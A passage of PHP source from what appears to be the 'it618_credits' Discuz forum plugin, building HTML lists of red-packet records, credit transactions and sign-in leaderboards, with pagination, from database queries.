				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_hongbao_main['it618_time']).'</font></td>
				</tr>';
				$funname='getmyhblist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_hongbao_main['it618_uid']);
				$username1=cutstr($username, 10, '');
				$salelist_get.='<tr>
				<td>'.$namestr.' - ['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' <font color=#999>'.$it618_state.'</font></td>
				<td><font color=#999><a href="'.it618_credits_rewriteurl($it618_hongbao_main['it618_uid']).'" title="'.$username.'" target="_blank">'.$username1.'</a> '.date('Y-m-d H:i:s', $it618_hongbao_main['it618_time']).'</font></td>
				</tr>';
				$funname='getallhblist';
			}
		}else{
			if($_GET['ac1']=='my'){
				$salelist_get.='<tr>
				<td>'.$namestr.'<br><font color=#999>['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' '.$it618_state.'</font>
				<br><font color=#999>'.date('Y-m-d H:i:s', $it618_hongbao_main['it618_time']).'</font></td>
				</tr>';
				$funname='getmyhblist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_hongbao_main['it618_uid']);
				$username1=cutstr($username, 10, '');
				$salelist_get.='<tr>
				<td>'.$namestr.'<br><font color=#999>['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' '.$it618_state.'</font>
				<br><font color=#999><a href="'.it618_credits_rewriteurl($it618_hongbao_main['it618_uid']).'" title="'.$username.'" target="_blank">'.$username1.'</a> '.date('Y-m-d H:i:s', $it618_hongbao_main['it618_time']).'</font></td>
				</tr>';
				$funname='getallhblist';
			}
		}
	}
	
	$count = DB::result_first("select count(1) from ".DB::table('it618_hongbao_main')." WHERE $sql");
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name,1)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name,1)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value,1);',$multipage);
		
		echo $salelist_get.'it618_split'.$multipage.'<span style="float:right;margin-top:9px">'.$it618_credits_lang['s483'].'<font color=red>'.$count.'</font></span>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value,1)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s312'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',1)">'.$it618_credits_lang['s313'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_credits_lang['s313'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',1)">'.$it618_credits_lang['s312'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',1)">'.$it618_credits_lang['s313'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',1)">'.$it618_credits_lang['s312'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s313'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font>it618_split'.$salelist_get.'it618_split<div style="text-align:center;">'.$multipage.'</div>';
	}
	exit;
}


if($_GET['ac']=="gethblist2"){
	$ppp = 12;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='1';
	if($_GET['ac1']=='my'){
		$sql='it618_uid='.$uid;
	}
	if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	$query = DB::query("SELECT * FROM ".DB::table('it618_hongbao_item')." WHERE $sql order by id desc LIMIT $startlimit, $ppp");
	while($it618_hongbao_item = DB::fetch($query)) {
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		
		$namestr=it618_credits_gethbname($it618_hongbao_item);
		
		$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_hongbao_item['it618_uid']);
		
		if($it618_mid!=$it618_hongbao_item['it618_mid']){
			$it618_mid=$it618_hongbao_item['it618_mid'];
			$it618_hongbao_main=DB::fetch_first("SELECT * FROM ".DB::table('it618_hongbao_main')." WHERE id=".$it618_mid);
			$hbindex=DB::result_first("select count(1) from ".DB::table('it618_hongbao_main')." where it618_tid=".$it618_hongbao_item['it618_tid']." and id<=".$it618_mid);
		}
		
		if($it618_hongbao_main['it618_isrand']==1)$tmpname=$it618_credits_lang['s552'];else $tmpname=$it618_credits_lang['s16'];
		if($it618_hongbao_main['it618_code']!='')$tmpname.=$it618_credits_lang['s529'];
		
		$count2 = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_hongbao_item')." WHERE it618_mid=".$it618_hongbao_main['id']);
		$count1=$it618_hongbao_main['it618_count']-$count2;
		
		$moneytmp = DB::result_first("SELECT SUM(it618_money) FROM ".DB::table('it618_hongbao_item')." WHERE it618_mid=".$it618_hongbao_main['id']);
		$money=$it618_hongbao_main['it618_money']-$moneytmp;
		
		if($it618_hongbao_main['it618_jfid']>0){
			$money1=str_replace(".00","",$money1);
			$moneytmp=str_replace(".00","",$moneytmp);
			$money=str_replace(".00","",$money);
			$moneyname=$_G['setting']['extcredits'][$it618_hongbao_main['it618_jfid']]['title'];
		}else{
			$moneyname=$it618_credits_lang['s198'];
		}
		
		if($it618_hongbao_main['it618_state']==1){
			$it618_state=$it618_credits_lang['s1213'].':<font color=red>'.$count1.'</font>'.$it618_credits_lang['s1214'].' <font color=red>'.$money.'</font>'.$moneyname.' '.$it618_credits_lang['s1215'].':'.'<font color=#390>'.$count2.'</font>'.$it618_credits_lang['s1214'];
		}else{
			$moneytmp1='';
			if($moneytmp!='')$moneytmp1=$moneytmp.$moneyname;
			$it618_state=$it618_credits_lang['s1216'].':'.$count2.''.$it618_credits_lang['s1214'].' '.$moneytmp1;
		}
		
		$it618_hongbao_item['it618_money']=str_replace(".00","",$it618_hongbao_item['it618_money']);
		
		if($_GET['wap']!=1){
			if($_GET['ac1']=='my'){
				$salelist_get.='<tr>
				<td>'.$namestr.' - ['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' <font color=#999>'.$it618_state.'</font></td>
				<td>'.$it618_credits_lang['s561'].'<font color=red>'.$it618_hongbao_item['it618_money'].'</font> '.$moneyname.' <font color=#999>'.date('Y-m-d H:i:s', $it618_hongbao_item['it618_time']).'</font></td>
				</tr>';
				$funname='getmyhblist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_hongbao_item['it618_uid']);
				$username1=cutstr($username, 10, '');
				$salelist_get.='<tr>
				<td>'.$namestr.' - ['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' <font color=#999>'.$it618_state.'</font></td>
				<td><font color=#999><a href="'.it618_credits_rewriteurl($it618_hongbao_item['it618_uid']).'" title="'.$username.'" target="_blank">'.$username1.'</a> '.$it618_credits_lang['s561'].'<font color=red>'.$it618_hongbao_item['it618_money'].'</font> '.$moneyname.' '.date('Y-m-d H:i:s', $it618_hongbao_item['it618_time']).'</font></td>
				</tr>';
				$funname='getallhblist';
			}
		}else{
			if($_GET['ac1']=='my'){
				$salelist_get.='<tr>
				<td>'.$namestr.'<br><font color=#999>['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' '.$it618_state.'
				<br>'.$it618_credits_lang['s561'].'<font color=red>'.$it618_hongbao_item['it618_money'].'</font> '.$moneyname.' '.date('Y-m-d H:i:s', $it618_hongbao_item['it618_time']).'</font></td>
				</tr>';
				$funname='getmyhblist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_hongbao_item['it618_uid']);
				$username1=cutstr($username, 10, '');
				$salelist_get.='<tr>
				<td>'.$namestr.'<br><font color=#999>['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' '.$it618_state.'
				<br><a href="'.it618_credits_rewriteurl($it618_hongbao_item['it618_uid']).'" title="'.$username.'" target="_blank">'.$username1.'</a> '.$it618_credits_lang['s561'].'<font color=red>'.$it618_hongbao_item['it618_money'].'</font> '.$moneyname.' '.date('Y-m-d H:i:s', $it618_hongbao_item['it618_time']).'</font></td>
				</tr>';
				$funname='getallhblist';
			}
		}
	}
	
	$count = DB::result_first("select count(1) from ".DB::table('it618_hongbao_item')." WHERE $sql");
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name,2)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name,2)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value,2);',$multipage);
		
		echo $salelist_get.'it618_split'.$multipage.'<span style="float:right;margin-top:9px">'.$it618_credits_lang['s483'].'<font color=red>'.$count.'</font></span>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value,2)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s312'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',2)">'.$it618_credits_lang['s313'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_credits_lang['s313'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',2)">'.$it618_credits_lang['s312'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',2)">'.$it618_credits_lang['s313'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\',2)">'.$it618_credits_lang['s312'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s313'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font>it618_split'.$salelist_get.'it618_split<div style="text-align:center;">'.$multipage.'</div>';
	}

}

function it618_credits_get_rand($proArr) { 
  $result = ''; 

  $proSum = array_sum($proArr); 

  foreach ($proArr as $key => $proCur) { 
	  $randNum = mt_rand(1, $proSum); 
	  if ($randNum <= $proCur) { 
		  $result = $key; 
		  break; 
	  } else { 
		  $proSum -= $proCur; 
	  } 
  } 
  unset ($proArr); 

  return $result; 
}


if($_GET['ac']=="getactivelist"){
	if($_GET['type']==1){
		if($_GET['type1']==1){
			$sql='';
		}else{
			$sql='where it618_uid='.$_G['uid'];
		}
		$query = DB::query("SELECT * FROM ".DB::table('it618_credits_money')." $sql order by id desc LIMIT 0, 30");
		while($it618_credits_money = DB::fetch($query)) {
			if($_GET['type1']==1){
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_money['it618_uid']);
				if($it618_credits['credits_wapsalepower']!=$uid){
					if($it618_credits['credits_isactive']==1){
						$userstr=it618_credits_getsmsstr($username,2).'**';
					}else{
						$userstr=$username;
					}
				}else{
					$userstr=$username;
				}
			}
			
			$tmpstr=$it618_credits_money['it618_bz'];
			
			if($it618_credits_money['it618_type']=='cz'){
				if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	
				if($it618_credits_money['it618_paytype']!='quan'){
					
					$zsjfstr='';
					if($it618_credits_money['it618_zsjfcount']>0){
						$jfname=it618_credits_getcreditstitle($it618_credits_money['it618_zsjfid']);
						$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_money['it618_zsjfcount'].'</font><font color=green>'.$jfname.'</font> ';
					}
					
					$tmpstr=$it618_credits_lang['s196'].'<font color=red>'.$it618_credits_money['it618_money1'].'</font>'.$it618_credits_lang['s198'].' '.$zsjfstr;
	
				}else{
					if($_GET['type1']==1){
						$tmpstr=$userstr.$it618_credits_lang['s224'].$it618_credits_lang['s196'].'<font color=red>'.$it618_credits_money['it618_money1'].'</font> '.$it618_credits_lang['t283'];
					}else{
						$tmpstr=$it618_credits_lang['s196'].'<font color=red>'.$it618_credits_money['it618_money1'].'</font> '.$it618_credits_lang['t283'].' '.$it618_credits_lang['s200'].$it618_credits_money['it618_payid'];
					}
				}
			}
			
			if($it618_credits_money['it618_type']=='sk'){
				$zsjfstr='';
				if($it618_credits_money['it618_zsjfcount']>0){
					$jfname=it618_credits_getcreditstitle($it618_credits_money['it618_zsjfid']);
					$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_money['it618_zsjfcount'].'</font><font color=green>'.$jfname.'</font> ';
				}
				
				$tmpstr=$it618_credits_lang['s1181'].'<font color=red>'.$it618_credits_money['it618_money1'].'</font>'.$it618_credits_lang['s198'].' '.$it618_credits_money['it618_bz'].' '.$zsjfstr;
			}
			
			if($it618_credits_money['it618_type']=='zy'){
				if($it618_credits_money['it618_zytype']=='it618_credits'){
					$it618_credits_sale=C::t('#it618_credits#it618_credits_sale')->fetch_by_id($it618_credits_money['it618_zyid']);
					
					$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
					$tmptitle=$it618_credits_lang['t214'].' = '.$cname.$it618_credits_lang['t215'].' * '.$it618_credits_sale['it618_bl'];
					
					$tmpstr=$it618_credits_lang['s201'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$it618_credits_lang['t96'].'<font color=red><b>'.$it618_credits_sale['it618_money'].'</b></font>'.$it618_credits_lang['s28'].' '.$tmptitle;
				}else if($it618_credits_money['it618_zytype']=='it618_union_yqmoney1'){
					$tmpstr=$it618_credits_money['it618_bz'];
					if($it618_union_reguser = DB::fetch_first("SELECT * FROM ".DB::table('it618_union_reguser')." where id=".$it618_credits_money['it618_zyid'])) {
						$regname=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_union_reguser['it618_uid']);
						$tmpstr=str_replace($it618_credits_lang['s1362'],$it618_credits_lang['s1362'].' '.$regname.' ',$tmpstr);
					}
				}else if($it618_credits_money['it618_zytype']=='it618_union_yqmoney2'){
					$tmpstr=$it618_credits_money['it618_bz'];
					if($it618_union_reguser = DB::fetch_first("SELECT * FROM ".DB::table('it618_union_reguser')." where id=".$it618_credits_money['it618_zyid'])) {
						$regname=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_union_reguser['it618_uid']);
						$tmpstr=str_replace($it618_credits_lang['s1362'],$it618_credits_lang['s1362'].' '.$regname.' ',$tmpstr);
						$tuiname=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_union_reguser['it618_tuiuid']);
						$tmpstr=str_replace($it618_credits_lang['s1363'],$it618_credits_lang['s1363'].' '.$tuiname.' ',$tmpstr);
					}
				}else{
					$tmpstr=$it618_credits_money['it618_bz'];
				}
			}
			
			if($it618_credits_money['it618_type']=='pay'){
				$tmpstr=$it618_credits_lang['s1206'].'<font color=red>'.$it618_credits_money['it618_money2'].'</font>'.$it618_credits_lang['s1208'].$it618_credits_money['it618_bz'];
			}
			
			if($it618_credits_money['it618_type']=='tx'){	
				$sjmoney=round(($it618_credits_money['it618_money2']-$it618_credits_money['it618_money2']*$it618_credits_money['it618_txtcbl']/100),2);		
				if($it618_credits_money['it618_txtcbl']>0){
					$tcblstr=$it618_credits_lang['s573'].$it618_credits_money['it618_txtcbl'].'% '.$it618_credits_lang['s574'].'<font color=red><b>'.$sjmoney.'</b></font> '.$it618_credits_lang['s28'];
				}else{
					$tcblstr=$it618_credits_lang['s1203'].' '.$it618_credits_lang['s574'].'<font color=red><b>'.$sjmoney.'</b></font> '.$it618_credits_lang['s28'];
				}
				
				$tmpstr=$it618_credits_lang['s353'].'<font color=red>'.$it618_credits_money['it618_money2'].'</font> '.$it618_credits_lang['s28'].' '.$tcblstr;
			}
			
			if($userstr!='')$tmpcss='style="float:right"';
			$getactivelist.='<tr><td>'.strip_tags($tmpstr).'<br><p><span '.$tmpcss.'>'.it618_credits_gettime($it618_credits_money['it618_time']).'</span>'.$userstr.'</p></td></tr>';
		}
	}else{
		if($_GET['type1']==1){
			$sql='';
		}else{
			$sql='and it618_uid1='.$_G['uid'];
		}
		$query = DB::query("SELECT * FROM ".DB::table('it618_credits_sale')." where it618_state>0 $sql order by id desc LIMIT 0, 30");
		while($it618_credits_sale = DB::fetch($query)) {
			
			if($_GET['type1']==1){
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid1']);
				
				if($it618_credits['credits_wapsalepower']!=$uid){
					if($it618_credits['credits_isactive']==1){
						$userstr=it618_credits_getsmsstr($username,2).'**';
					}else{
						$userstr=$username;
					}
				}else{
					$userstr=$username;
				}
			}
				
			if($it618_credits_sale['it618_saletype']=='recharge'){
				if($it618_credits_sale['it618_uid1']==$it618_credits_sale['it618_uid2']){
					$whostr=$it618_credits_lang['s192'];
				}else{
					if($uid==$it618_credits_sale['it618_uid2']){
						$whostr=$it618_credits_lang['s115'];
					}else{
						$usernametmp=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
						
						if($it618_credits['credits_wapsalepower']!=$uid){
							$whostr=it618_credits_getsmsstr($usernametmp,2).'**';
						}else{
							$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$usernametmp.'</a> ';
						}
					}
				}
				$credittitle=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
		
				if($it618_credits_sale['it618_paytype']!='quan'){
		
					$tmphl='1 '.$credittitle.' = '.$it618_credits_sale['it618_bl'].' '.$it618_credits_lang['s28'];
					
					$zsjfstr='';
					if($it618_credits_sale['it618_zsjfcount']>0){
						$zscredittitle=it618_credits_getcreditstitle($it618_credits_sale['it618_zsjfid']);
						$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_sale['it618_zsjfcount'].'</font><font color=green>'.$zscredittitle.'</font> ';
					}
					
					$tmpstr=$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s196'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green title="'.$tmphl.'">'.$credittitle.'</font> '.$zsjfstr;
		
				}else{
					
					if($_GET['type1']==1){
						$tmpstr=$it618_credits_lang['s224'].$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s199'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$credittitle.'</font> ';
					}else{
						$tmpstr=$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s199'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$credittitle.'</font> '.$it618_credits_lang['s200'].$it618_credits_sale['it618_payid'];
					}
				}
			}
		
			if($it618_credits_sale['it618_saletype']=='zhuan'){
				$cname1=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
				$cname2=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid2']);
				
				$tmpstr=$it618_credits_lang['s201'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname1.'</font>'.$it618_credits_lang['s202'].'<font color=red>'.intval($it618_credits_sale['it618_jfcount']*$it618_credits_sale['it618_bl']).'</font><font color=green>'.$cname2.'</font> '.$cname2.$it618_credits_lang['t215'].' = '.$cname1.$it618_credits_lang['t215'].'*'.$it618_credits_sale['it618_bl'].' '.$bzstr;	
			}
			if($it618_credits_sale['it618_saletype']=='transfer'){
				$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
				
				if($uid==$it618_credits_sale['it618_uid2']){
					$whostr=$it618_credits_lang['s115'];
				}else{
					$usernametmp=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
					
					if($it618_credits['credits_wapsalepower']!=$uid){
						$whostr=it618_credits_getsmsstr($usernametmp,2).'**';
					}else{
						$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$usernametmp.'</a> ';
					}
				}
				
				$tmpstr=$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s203'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$bzstr;	
			}
			
			if($it618_credits_sale['it618_saletype']=='tq'){
				$cname=$_G['setting']['extcredits'][$it618_credits_sale['it618_jfid1']]['title'];
				
				if($it618_credits_sale['it618_state']==10){
					$state=' <font color=red>'.$it618_credits_lang['s1597'].'</font>';
				}
				if($it618_credits_sale['it618_state']==1)$state=' <font color=green>'.$it618_credits_lang['s1598'].'</font>';
				
				$tmpstr=$it618_credits_lang['s1574'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font>  '.$state;		
			}
			
			if($it618_credits_sale['it618_saletype']=='credit_plus'){
				$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
				
				$usernametmp=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
				$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$usernametmp.'('.$it618_credits_sale['it618_uid2'].')</a>';
				
				$tmpstr=$it618_credits_lang['s910'].$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s908'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$bzstr;	
			}
			
			if($it618_credits_sale['it618_saletype']=='credit_minus'){
				$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
				
				$usernametmp=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
				if($it618_credits['credits_wapsalepower']!=$uid){
					$whostr=it618_credits_getsmsstr($usernametmp,2).'**';
				}else{
					$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$usernametmp.'</a> ';
				}
				
				$tmpstr=$it618_credits_lang['s910'].$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s909'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$bzstr;	
			}
			
			if($it618_credits_sale['it618_saletype']=='zy'){
				$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
				$tmptitle=$it618_credits_lang['t214'].' = '.$cname.$it618_credits_lang['t215'].' * '.$it618_credits_sale['it618_bl'];
				
				if($it618_credits_sale['it618_state']==2){$state='<font color=green>'.$it618_credits_lang['s206'].'</font>';$btnstr='';}
				
				$zsjfstr='';
				if($it618_credits_sale['it618_zsjfcount']>0){
					$zscname=it618_credits_getcreditstitle($it618_credits_sale['it618_zsjfid']);
					$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_sale['it618_zsjfcount'].'</font><font color=green>'.$zscname.'</font> ';
				}
				
				$tmpstr=$it618_credits_lang['s201'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$it618_credits_lang['s207'].'<font color=red><b title="'.$tmptitle.'">'.$it618_credits_sale['it618_money'].'</b></font>'.$it618_credits_lang['s28'].' '.$zsjfstr;
			}
			
			if($userstr!='')$tmpcss='style="float:right"';
			$getactivelist.='<tr><td>'.strip_tags($tmpstr).'<br><p><span '.$tmpcss.'>'.it618_credits_gettime($it618_credits_sale['it618_time']).'</span>'.$userstr.'</p></td></tr>';
		}
	}
	
	if($getactivelist==''){
		if($uid==0){
			$getactivelist=$it618_credits_lang['s1331'];
		}else{
			if($_GET['type']==1){
				$getactivelist=$it618_credits_lang['s1332'];
			}else{
				$getactivelist=$it618_credits_lang['s1333'];
			}
		}
		$getactivelist.='<tr><td>'.$getactivelist.'</td></tr>';
	}
	
	echo $getactivelist;exit;
}


if($_GET['ac']=="getqdlist_ph"){
	$qd_phcount=30;
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/qdset.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_credits/config/qdset.php';
	}
	
	$n=1;
	if($_GET['type']==1){
		$query = DB::query("SELECT it618_uid,it618_concount_month as it618_count FROM ".DB::table('it618_credits_qd_main')." ORDER BY it618_concount_month desc,it618_time LIMIT 0,".$qd_phcount);
	}
	
	if($_GET['type']==2){
		$query = DB::query("SELECT it618_uid,it618_allcount_month as it618_count FROM ".DB::table('it618_credits_qd_main')." ORDER BY it618_allcount_month desc,it618_time LIMIT 0,".$qd_phcount);
	}
	
	if($_GET['type']==3){
		$query = DB::query("SELECT it618_uid,it618_concount as it618_count FROM ".DB::table('it618_credits_qd_main')." ORDER BY it618_concount desc,it618_time LIMIT 0,".$qd_phcount);
	}
	
	if($_GET['type']==4){
		$query = DB::query("SELECT it618_uid,it618_allcount as it618_count FROM ".DB::table('it618_credits_qd_main')." ORDER BY it618_allcount desc,it618_time LIMIT 0,".$qd_phcount);
	}
	
	while($it618_credits_qd_main = DB::fetch($query)) {
		$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_qd_main['it618_uid']);
		$conphstr.='<tr><td width="20" style="text-align:center">'.$n.'</td><td><a href="'.it618_credits_rewriteurl($it618_credits_qd_main['it618_uid']).'" target="_blank">'.$username.'('.$it618_credits_qd_main['it618_uid'].')</a></td><td style="color:red;text-align:center">'.$it618_credits_qd_main['it618_count'].'</td></tr>';
		$n=$n+1;
	}
	
	echo $conphstr;
	exit;
}


if($_GET['ac']=="gethblist_ph"){
	$n=1;
	if($_GET['type']==1){
		$query = DB::query("SELECT it618_uid,it618_postcount as it618_count FROM ".DB::table('it618_hongbao_ph')." ORDER BY it618_postcount desc LIMIT 0,15");
	}
	
	if($_GET['type']==2){
		$query = DB::query("SELECT it618_uid,it618_getcount as it618_count FROM ".DB::table('it618_hongbao_ph')." ORDER BY it618_getcount desc LIMIT 0,15");
	}
	
	while($it618_hongbao_ph = DB::fetch($query)) {
		$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_hongbao_ph['it618_uid']);
		$conphstr.='<tr><td width=20 style="text-align:center">'.$n.'</td><td><a href="'.it618_credits_rewriteurl($it618_hongbao_ph['it618_uid']).'" target="_blank">'.$username.'('.$it618_hongbao_ph['it618_uid'].')</a></td><td class="qdcount">'.$it618_hongbao_ph['it618_count'].'</td></tr>';
		$n=$n+1;
	}
	
	echo $conphstr;exit;
}


if($_GET['ac']=="postskset"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/skset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/skset.php';
		}
		
		if($sk_isok!=1){
			echo $it618_credits_lang['t253'];exit;
		}
		
		if($_GET['it618_url']!=''){
			$tmparr=explode("://",$_GET['it618_url']);
			if(count($tmparr)==1){
				echo $it618_credits_lang['t251'];exit;
			}
			
			if($sk_urls!=''){
				$flag=0;
